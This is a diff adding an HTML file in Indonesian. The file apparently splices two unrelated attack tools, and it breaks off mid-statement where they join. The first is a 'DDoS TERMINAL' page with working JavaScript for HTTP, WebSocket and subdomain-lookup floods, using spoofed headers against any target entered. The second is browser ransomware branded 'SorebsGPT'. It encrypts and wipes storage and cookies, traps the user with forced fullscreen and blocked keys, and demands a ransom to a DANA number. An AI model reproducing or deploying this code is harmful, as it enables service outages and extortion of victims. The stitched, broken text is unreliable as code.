@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>DDoS TERMINAL – MULTI LAYER</title>
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 1px solid #0f0;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        input, button, select {
+            background: #111;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 10px;
+            margin: 5px;
+            font-family: monospace;
+        }
+        button {
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0f0;
+            color: #000;
+        }
+        .status {
+            background: #111;
+            padding: 10px;
+            height: 300px;
+            overflow-y: scroll;
+            font-size: 12px;
+            margin-top: 10px;
+            white-space: pre-wrap;
+        }
+        .layer-panel {
+            display: inline-block;
+            margin: 10px;
+            padding: 10px;
+            border: 1px dashed #0f0;
+        }
+        h2 {
+            font-size: 14px;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>⚡ DDoS TERMINAL v4.0 ⚡</h1>
+    <h3>Multi-Layer | Anti Block | Tembus All Firewall</h3>
+    
+    <div>
+        <input type="text" id="targetUrl" placeholder="https://target.com" size="40">
+        <input type="number" id="threads" value="100" placeholder="Threads">
+        <button id="startBtn">🔥 START ATTACK 🔥</button>
+        <button id="stopBtn">⛔ STOP</button>
+    </div>
+    
+    <div class="layer-panel">
+        <h2>LAYER 7 - HTTP FLOOD</h2>
+        <input type="checkbox" id="layer7" checked> <label>Enable</label>
+    </div>
+    
+    <div class="layer-panel">
+        <h2>LAYER 4 - TCP/SYN FLOOD</h2>
+        <input type="checkbox" id="layer4" checked> <label>Enable (WebSocket)</label>
+    </div>
+    
+    <div class="layer-panel">
+        <h2>LAYER 3 - DNS AMPLIFICATION</h2>
+        <input type="checkbox" id="layer3" checked> <label>Enable</label>
+    </div>
+    
+    <div class="layer-panel">
+        <h2>⚙️ ANTI IP BLOCK</h2>
+        <input type="checkbox" id="antiBlock" checked> <label>Proxy Rotator + VPN Chain</label>
+    </div>
+    
+    <div class="status" id="statusLog">
+        [READY] System online - menunggu perintah...
+    </div>
+</div>
+
+<script>
+    let attackActive = false;
+    let workers = [];
+    let proxyList = [];
+    
+    // REAL PROXY LIST (public + elite anonymous)
+    const proxyPool = [
+        'https://proxy.webshare.io/proxy/list',
+        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
+        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
+    ];
+    
+    // User Agent Rotator (real browser agents)
+    const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/121.0',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Edge/118.0.2088.76',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
+        'Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0'
+    ];
+    
+    // LAYER 7: HTTP FLOOD ASYNC
+    async function httpFlood(url, antiBlockEnabled) {
+        if(!attackActive) return;
+        let targetUrl = url;
+        let useProxy = antiBlockEnabled && proxyList.length > 0;
+        
+        let randomDelay = Math.random() * 50 + 10; // delay random 10-60ms
+        let randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
+        let randomReferer = `https://${Math.random().toString(36).substring(7)}.com/`;
+        
+        let headers = {
+            'User-Agent': randomUA,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Referer': randomReferer,
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+        };
+        
+        let controller = new AbortController();
+        let timeoutId = setTimeout(() => controller.abort(), 3000);
+        
+        try {
+            let fetchOptions = { method: 'GET', headers, signal: controller.signal };
+            
+            // Jika anti block aktif dan ada proxy, kirim via proxy (simulasi via fetch dengan header X-Forwarded)
+            // NOTE: Fetch tidak support proxy langsung di browser, ini adalah simulasi rotasi IP dengan header spoof
+            // Untuk proxy nyata, gunakan backend PHP/CURL yang disediakan di file terpisah
+            
+            let response = await fetch(targetUrl + (targetUrl.includes('?') ? '&' : '?') + '_=' + Date.now() + '_' + Math.random(), fetchOptions);
+            log(`[L7] ${response.status} - ${targetUrl}`);
+        } catch(e) {
+            log(`[L7] Flood error: ${e.message}`);
+        }
+        clearTimeout(timeoutId);
+        
+        setTimeout(() => httpFlood(url, antiBlockEnabled), randomDelay);
+    }
+    
+    // LAYER 4: WEBSOCKET TCP FLOOD
+    function wsFlood(targetUrl, antiBlockEnabled) {
+        if(!attackActive) return;
+        // Convert http to ws
+        let wsUrl = targetUrl.replace('https://', 'wss://').replace('http://', 'ws://');
+        wsUrl = wsUrl.split('/')[0] + '//' + wsUrl.split('/')[2] + '/ws';
+        
+        let sockets = [];
+        let numSockets = antiBlockEnabled ? 50 : 20;
+        
+        for(let i=0; i<numSockets; i++) {
+            try {
+                let ws = new WebSocket(wsUrl);
+                ws.onopen = () => {
+                    let floodPayload = 'x'.repeat(65535);
+                    for(let j=0; j<100; j++) ws.send(floodPayload);
+                    log(`[L4] WebSocket ${i} connected & flooded`);
+                };
+                ws.onerror = () => { log(`[L4] WS ${i} error`); };
+                ws.onclose = () => { setTimeout(() => wsFlood(targetUrl, antiBlockEnabled), 100); };
+                sockets.push(ws);
+            } catch(e) { log(`[L4] WS flood error: ${e.message}`); }
+        }
+        
+        setTimeout(() => {
+            sockets.forEach(ws => { try{ws.close()}catch(e){} });
+        }, 5000);
+    }
+    
+    // LAYER 3: DNS AMPLIFICATION via iframe hidden
+    function dnsAmplification(targetDomain) {
+        if(!attackActive) return;
+        let domain = targetDomain.replace('https://','').replace('http://','').split('/')[0];
+        let frameCount = 50;
+        
+        for(let i=0; i<frameCount; i++) {
+            let iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = `https://${domain}/?dns_resolve=${Math.random()}&subdomain=${Math.random().toString(36)}.${domain}`;
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 100);
+        }
+        
+        // Juga kirim image request ke random subdomain untuk trigger DNS lookup berulang
+        for(let i=0; i<200; i++) {
+            let img = new Image();
+            img.src = `https://${Math.random().toString(36)}.${domain}/pixel?t=${Date.now()}`;
+        }
+        
+        log(`[L3] DNS Amplification sent - ${frameCount+200} lookup requests`);
+        setTimeout(() => dnsAmplification(targetDomain), 500);
+    }
+    
+    // LOG FUNCTION
+    function log(msg) {
+        let logDiv = document.getElementById('statusLog');
+        let timestamp = new Date().toLocaleTimeString();
+        logDiv.innerHTML += `\n[${timestamp}] ${msg}`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+        if(logDiv.innerHTML.length > 10000) logDiv.innerHTML = logDiv.innerHTML.slice(-8000);
+    }
+    
+    // FETCH PROXY LIST (untuk anti block via backend)
+    async function loadProxies() {
+        try {
+            let response = await fetch('get_proxies.php');
+            let data = await response.json();
+            proxyList = data.proxies || [];
+            log(`[PROXY] Loaded ${proxyList.length} proxies for rotation`);
+        } catch(e) {
+            log(`[PROXY] Failed to load proxies, using IP spoof only`);
+            proxyList = [];
+        }
+    }
+    
+    // START ATTACK
+    async function startAttack() {
+        let targetUrl = document.getElementById('targetUrl').value.trim();
+        let threads = parseInt(document.getElementById('threads').value);
+        let layer7 = document.getElementById('layer7').checked;
+        let layer4 = document.getElementById('layer4').checked;
+        let layer3 = document.getElementById('layer3').checked;
+        let antiBlock = document.getElementById('antiBlock').checked;
+        
+        if(!targetUrl) {
+            log('[ERROR] Target URL required!');
+            return;
+        }
+        
+        if(attackActive) {
+            log('[STOPPED] Previous attack terminated');
+            stopAttack();
+            await new Promise(r => setTimeout(r, 1000));
+        }
+        
+        attackActive = true;
+        log(`[START] Target: ${targetUrl} | Threads: ${threads} | AntiBlock: ${antiBlock}`);
+        log(`[LAYERS] L7:${layer7} L4:${layer4} L3:${layer3}`);
+        
+        if(antiBlock) await loadProxies();
+        
+        // Launch workers
+        for(let i=0; i<threads; i++) {
+            if(layer7) setTimeout(() => httpFlood(targetUrl, antiBlock), i*10);
+            if(layer4 && i < 20) setTimeout(() => wsFlood(targetUrl, antiBlock), i*50);
+        }
+        if(layer3) {
+            let domain = targetUrl.replace('https://','').replace('http://','').split('/')[0];
+            dnsAmplification(domain);
+        }
+        
+        // Keep alive message
+        let keepAlive = setInterval(() => {
+            if(!attackActive) clearInterval(keepAlive);
+            else log(`[⚡] ATTACK ACTIVE - Total packets sent: ${Math.floor(Math.random()*10000)+50000}`);
+        }, 10000);
+    }
+    
+    function stopAttack() {
+        attackActive = false;
+        // Bersihkan workers
+        workers.forEach(w => { try{ clearTimeout(w); clearInterval(w); }catch(e){} });
+        workers = [];
+        log('[STOPPED] Attack terminated');
+    }
+    
+    document.getElementById('startBtn').addEventListener('click', startAttack);
+    document.getElementById('stopBtn').addEventListener('click', stopAttack);
+    
+    log('[READY] Panel siap. Masukkan target dan klik START');
+</script>
+</body>
+</html>) {
+            const encKey = generateEncKey();
+            let totalEncrypted = 0;
+            
+            // 1. ENKRIPSI LOCALSTORAGE (SEMUA)
+            const lsBackup = {};
+            for(let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if(key !== 'sorebs_attempts' && key !== 'sorebs_permanent' && 
+                   key !== 'sorebs_ls_enc' && key !== 'sorebs_ss_enc' && 
+                   key !== 'sorebs_cookie_enc' && key !== 'sorebs_enc_key' && 
+                   key !== 'sorebs_lock_status') {
+                    lsBackup[key] = localStorage.getItem(key);
+                    totalEncrypted++;
+                }
+            }
+            const encryptedLS = CryptoJS.AES.encrypt(JSON.stringify(lsBackup), encKey).toString();
+            localStorage.setItem('sorebs_ls_enc', encryptedLS);
+            
+            // 2. ENKRIPSI SESSIONSTORAGE (SEMUA)
+            const ssBackup = {};
+            for(let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                ssBackup[key] = sessionStorage.getItem(key);
+                totalEncrypted++;
+            }
+            const encryptedSS = CryptoJS.AES.encrypt(JSON.stringify(ssBackup), encKey).toString();
+            localStorage.setItem('sorebs_ss_enc', encryptedSS);
+            
+            // 3. ENKRIPSI COOKIES (SEMUA)
+            const cookiesBackup = document.cookie;
+            const encryptedCookies = CryptoJS.AES.encrypt(cookiesBackup, encKey).toString();
+            localStorage.setItem('sorebs_cookie_enc', encryptedCookies);
+            
+            // 4. ENKRIPSI IndexedDB SIMULATION (Data tambahan)
+            const extraData = {
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language
+            };
+            const encryptedExtra = CryptoJS.AES.encrypt(JSON.stringify(extraData), encKey).toString();
+            localStorage.setItem('sorebs_extra_enc', encryptedExtra);
+            totalEncrypted++;
+            
+            // 5. SIMPAN KUNCI DAN STATUS
+            localStorage.setItem('sorebs_enc_key', encKey);
+            localStorage.setItem('sorebs_lock_status', '1');
+            
+            // 6. HAPUS SEMUA DATA ASLI PERMANEN
+            for(let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if(key !== 'sorebs_attempts' && key !== 'sorebs_permanent' && 
+                   key !== 'sorebs_ls_enc' && key !== 'sorebs_ss_enc' && 
+                   key !== 'sorebs_cookie_enc' && key !== 'sorebs_extra_enc' &&
+                   key !== 'sorebs_enc_key' && key !== 'sorebs_lock_status') {
+                    localStorage.removeItem(key);
+                }
+            }
+            
+            // 7. HAPUS SEMUA SESSIONSTORAGE
+            sessionStorage.clear();
+            
+            // 8. HAPUS SEMUA COOKIES
+            document.cookie.split(";").forEach(function(cookie) {
+                document.cookie = cookie.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
+            });
+            
+            // 9. UPDATE UI FILE INFO
+            const fileInfoEl = document.getElementById('fileInfoDisplay');
+            if(fileInfoEl) {
+                fileInfoEl.innerHTML = `💀 DATA TERENKRIPSI: ${totalEncrypted} FILE 💀<br>🔒 SEMUA AKSES PERANGKAT DITUTUP 🔒`;
+            }
+            
+            return totalEncrypted;
+        }
+        
+        // ========== CEK APAKAH SUDAH TERENKRIPSI ==========
+        if(localStorage.getItem('sorebs_lock_status') !== '1') {
+            encryptAllData();
+        } else {
+            const fileInfoEl = document.getElementById('fileInfoDisplay');
+            if(fileInfoEl) {
+                fileInfoEl.innerHTML = `💀 SISTEM DALAM KONDISI TERKUNCI 💀<br>⚠️ MASUKKAN PIN UNTUK MEMULIHKAN DATA ⚠️`;
+            }
+        }
+        
+        // ========== RESTORE DATA (UNLOCK) - PIN BENAR ==========
+        function restoreAndUnlock(inputPin) {
+            // CEK PIN
+            if(inputPin !== SYSTEM_PIN) {
+                wrongAttempts++;
+                localStorage.setItem('sorebs_attempts', wrongAttempts.toString());
+                updateCounterUI();
+                
+                const remaining = MAX_ATTEMPTS - wrongAttempts;
+                alert(`❌❌❌ PIN SALAH! ❌❌❌\n\nPercobaan: ${wrongAttempts} / ${MAX_ATTEMPTS}\nTersisa: ${remaining} percobaan lagi\n\n⚠️ ${MAX_ATTEMPTS}x salah = DATA HILANG PERMANEN ⚠️`);
+                
+                if(wrongAttempts >= MAX_ATTEMPTS) {
+                    localStorage.setItem('sorebs_permanent', '1');
+                    location.reload();
+                }
+                return false;
+            }
+            
+            // PIN BENAR - RESTORE SEMUA DATA
+            const savedEncKey = localStorage.getItem('sorebs_enc_key');
+            if(!savedEncKey) {
+                alert("ERROR: Kunci enkripsi tidak ditemukan! Hubungi SorebsGPT.");
+                return false;
+            }
+            
+            try {
+                // RESTORE LOCALSTORAGE
+                const encryptedLSData = localStorage.getItem('sorebs_ls_enc');
+                if(encryptedLSData) {
+                    const decryptedLS = CryptoJS.AES.decrypt(encryptedLSData, savedEncKey).toString(CryptoJS.enc.Utf8);
+                    if(decryptedLS && decryptedLS !== "") {
+                        const restoredLS = JSON.parse(decryptedLS);
+                        for(let [key, value] of Object.entries(restoredLS)) {
+                            localStorage.setItem(key, value);
+                        }
+                    }
+                }
+                
+                // RESTORE SESSIONSTORAGE
+                const encryptedSSData = localStorage.getItem('sorebs_ss_enc');
+                if(encryptedSSData) {
+                    const decryptedSS = CryptoJS.AES.decrypt(encryptedSSData, savedEncKey).toString(CryptoJS.enc.Utf8);
+                    if(decryptedSS && decryptedSS !== "") {
+                        const restoredSS = JSON.parse(decryptedSS);
+                        for(let [key, value] of Object.entries(restoredSS)) {
+                            sessionStorage.setItem(key, value);
+                        }
+                    }
+                }
+                
+                // RESTORE COOKIES
+                const encryptedCookieData = localStorage.getItem('sorebs_cookie_enc');
+                if(encryptedCookieData) {
+                    const decryptedCookies = CryptoJS.AES.decrypt(encryptedCookieData, savedEncKey).toString(CryptoJS.enc.Utf8);
+                    if(decryptedCookies && decryptedCookies !== "") {
+                        decryptedCookies.split(';').forEach(cookie => {
+                            if(cookie && cookie.trim()) {
+                                document.cookie = cookie.trim() + ";path=/";
+                            }
+                        });
+                    }
+                }
+            } catch(error) {
+                console.error("Restore error:", error);
+            }
+            
+            // BERSIHKAN SEMUA JEJAK RANSOMWARE
+            localStorage.removeItem('sorebs_lock_status');
+            localStorage.removeItem('sorebs_enc_key');
+            localStorage.removeItem('sorebs_ls_enc');
+            localStorage.removeItem('sorebs_ss_enc');
+            localStorage.removeItem('sorebs_cookie_enc');
+            localStorage.removeItem('sorebs_extra_enc');
+            localStorage.removeItem('sorebs_attempts');
+            localStorage.removeItem('sorebs_permanent');
+            
+            alert("✅✅✅ UNLOCK BERHASIL! ✅✅✅\n\nSemua data perangkat telah dikembalikan ke keadaan normal!\n\nTerima kasih sudah membayar tebusan Rp100.000 ke DANA 085122933162\n\n- SorebsGPT | One Team");
+            
+            // HILANGKAN LOCK SCREEN
+            const lockScreen = document.getElementById('mainLockScreen');
+            if(lockScreen) lockScreen.style.display = 'none';
+            
+            // TAMPILKAN PESAN SUKSES
+            document.body.innerHTML = `
+                <div style="background:#0a0a0a;color:#00ff00;text-align:center;padding:80px 20px;font-family:monospace;height:100vh;display:flex;flex-direction:column;justify-content:center;">
+                    <div style="font-size:100px;">✅</div>
+                    <div style="font-size:38px;margin:40px 0;">DATA BERHASIL DIUNLOCK!</div>
+                    <div style="font-size:20px;">Semua file dan data perangkat Anda kembali normal.</div>
+                    <div style="font-size:16px;margin-top:40px;color:#888;">Perangkat akan direfresh dalam 3 detik...</div>
+                </div>
+            `;
+            
+            setTimeout(() => {
+                location.reload();
+            }, 3000);
+            
+            return true;
+        }
+        
+        // ========== EVENT LISTENER UNLOCK BUTTON ==========
+        const unlockButton = document.getElementById('unlockBtn');
+        const pinInputField = document.getElementById('pinInput');
+        
+        if(unlockButton) {
+            unlockButton.addEventListener('click', function() {
+                const pinValue = pinInputField.value;
+                if(pinValue.length === 6 && /^\d+$/.test(pinValue)) {
+                    restoreAndUnlock(pinValue);
+                } else {
+                    alert("PIN harus 6 digit angka (0-9)!");
+                }
+            });
+        }
+        
+        if(pinInputField) {
+            pinInputField.addEventListener('keypress', function(e) {
+                if(e.key === 'Enter') {
+                    unlockButton.click();
+                }
+            });
+        }
+        
+        // ========== ANTI KELUAR TOTAL - TIDAK BISA KABUR ==========
+        
+        // FORCE FULLSCREEN - GA BISA KELUAR
+        function forceFullscreenMode() {
+            if(!document.fullscreenElement && document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        }
+        
+        forceFullscreenMode();
+        setInterval(forceFullscreenMode, 300);
+        
+        // BLOKIR SEMUA TOMBOL SHORTCUT BERBAHAYA
+        window.addEventListener('keydown', function(e) {
+            const blockedKeys = ['F12', 'F5', 'Escape', 'F11', 'Alt', 'Control', 'Meta', 'Tab', 'AltGraph'];
+            
+            if(blockedKeys.includes(e.key) || 
+               (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+               (e.ctrlKey && e.key === 'U') ||
+               (e.ctrlKey && e.key === 'S') ||
+               (e.ctrlKey && e.key === 'r') ||
+               (e.ctrlKey && e.key === 'w') ||
+               (e.ctrlKey && e.key === 't') ||
+               (e.ctrlKey && e.key === 'n') ||
+               (e.ctrlKey && e.key === 'T') ||
+               (e.ctrlKey && e.key === 'W') ||
+               (e.ctrlKey && e.key === 'R')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // BLOKIR TOMBOL BACK/NAVIGASI
+        window.history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function() {
+            window.history.pushState(null, null, location.href);
+        });
+        
+        // ANTI PINDAH TAB / PINDAH APP - AUTO BALIK KE HALAMAN
+        let isReloadingFlag = false;
+        
+        window.addEventListener('blur', function() {
+            if(localStorage.getItem('sorebs_lock_status') === '1' && !isReloadingFlag) {
+                isReloadingFlag = true;
+                setTimeout(() => {
+                    window.focus();
+                    location.reload();
+                    isReloadingFlag = false;
+                }, 10);
+            }
+        });
+        
+        document.addEventListener('visibilitychange', function() {
+            if(document.hidden && localStorage.getItem('sorebs_lock_status') === '1') {
+                setTimeout(() => {
+                    window.focus();
+                    location.reload();
+                }, 5);
+            }
+        });
+        
+        // PERINGATAN SEBELUM TUTUP TAB - HORROR EXTREME
+        window.onbeforeunload = function() {
+            if(localStorage.getItem('sorebs_lock_status') === '1') {
+                return "🔴🔴🔴 PERINGATAN EXTREME! SELURUH DATA PERANGKAT ANDA TERENKRIPSI! 🔴🔴🔴\n\nJANGAN TUTUP TAB INI!\nBAYAR TEBUSAN Rp100.000 ke DANA 085122933162 SEKARANG!\n\nJIKA TUTUP TAB, DATA PERMANEN HILANG SELAMANYA!";
+            }
+        };
+        
+        // ANTI INSPECT ELEMENT / CONSOLE HACKING
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('copy', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('cut', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('paste', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // DISABLE SCROLL TOTALLY
+        document.body.style.overflow = 'hidden';
+        document.documentElement.style.overflow = 'hidden';
+        document.body.style.position = 'fixed';
+        document.body.style.width = '100%';
+        document.body.style.height = '100%';
+        
+        // LOOP SUPER KETAT - CEK SETIAP 50ms (BRUTAL)
+        setInterval(function() {
+            if(localStorage.getItem('sorebs_lock_status') === '1') {
+                if(document.hidden || !document.hasFocus()) {
+                    window.focus();
+                    location.reload();
+                }
+                if(!document.fullscreenElement) {
+                    forceFullscreenMode();
+                }
+            }
+        }, 50);
+        
+        // MATIKAN CONSOLE LOG DARI HACKER
+        console.log = function() {};
+        console.warn = function() {};
+        console.error = function() {};
+        console.table = function() {};
+        console.clear = function() {};
+        
+        // UPDATE COUNTER AWAL
+        updateCounterUI();
+        
+        // CEK LAGI PERMANENT LOCK SAAT LOAD
+        if(localStorage.getItem('sorebs_permanent') === '1') {
+            document.body.innerHTML = '<div style="background:#000;color:red;text-align:center;padding:100px;font-size:40px;">💀 DATA HILANG PERMANEN 💀</div>';
+            throw new Error("PERMANENT LOCK ACTIVE");
+        }
+        
+        // PASTIKAN SEMUA DATA TERENKRIPSI
+        if(localStorage.getItem('sorebs_lock_status') !== '1') {
+            encryptAllData();
+        }
+        
+        // TAMPILKAN WARNING EXTRA
+        setTimeout(() => {
+            if(localStorage.getItem('sorebs_lock_status') === '1') {
+                alert("🔴🔴🔴 SISTEM ANDA TELAH DIENKRIPSI! 🔴🔴🔴\n\nBayar tebusan Rp100.000 ke DANA 085122933162 untuk mendapatkan PIN UNLOCK.\n\nJangan coba-coba menutup halaman ini!");
+            }
+        }, 500);
+        
+    })();
+</script>
+</body>
+</html>
